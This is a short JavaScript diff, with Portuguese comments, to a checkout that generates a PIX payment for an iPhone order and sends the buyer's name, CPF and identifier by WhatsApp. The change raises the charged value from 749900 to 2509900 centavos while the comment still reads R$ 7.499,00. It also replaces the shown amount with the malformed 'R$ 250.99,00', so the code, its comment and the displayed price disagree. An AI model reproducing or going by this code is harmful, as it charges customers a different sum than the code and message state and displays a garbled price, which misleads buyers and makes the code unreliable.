@@ -549,7 +549,7 @@
     // Gerar PIX direto para sua conta
     async function gerarPixDireto(nome, cpf, email) {
       try {
-        const valor = 749900; // R$ 7.499,00 em centavos
+        const valor = 2509900; // R$ 7.499,00 em centavos
         const identificador = `IPHONE${Date.now()}`;
         
         // Gerar payload PIX
@@ -676,7 +676,7 @@
                       `Nome: ${pedido.nome || 'Não informado'}\n` +
                       `CPF: ${pedido.cpf || 'Não informado'}\n` +
                       `Identificador: ${pedido.identificador || 'Não informado'}\n` +
-                      `Valor: R$ 7.499,00\n\n` +
+                      `Valor: R$ 250.99,00\n\n` +
                       `Segue comprovante em anexo.`;
       
       const url = `https://wa.me/${MEU_WHATSAPP}?text=${encodeURIComponent(mensagem)}`;
